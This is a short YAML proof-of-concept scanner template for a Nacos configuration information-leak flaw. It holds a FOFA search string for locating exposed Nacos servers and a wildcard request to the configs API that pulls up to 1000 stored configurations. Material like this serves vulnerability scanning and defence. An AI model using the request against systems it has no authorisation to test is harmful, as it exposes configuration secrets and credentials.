id: poc-yaml-nacos-configs-info-leak
info:
  name: Nacos configs 信息泄露漏洞
  severity: medium
  tags:
  - 信息泄露
  finger: nacos
  fofa: app="Nacos" && icon_hash="13942501"
requests:
- method: GET
  path: /nacos/
  expression: status_code == 200 && contains(title,"Nacos")
- method: GET
  path: /nacos/v1/cs/configs?dataId=*&group=*&appName=&config_tags=&pageNo=1&pageSize=1000&tenant=*&search=blur
  expression: status_code == 200 && contains(body,"\"totalCount\":") && matches(body,`"content":.*?",`)
    && matches(body,`"tenant":".*?",`) && contains(content_type,"application/json")
variables: {}
transport: http
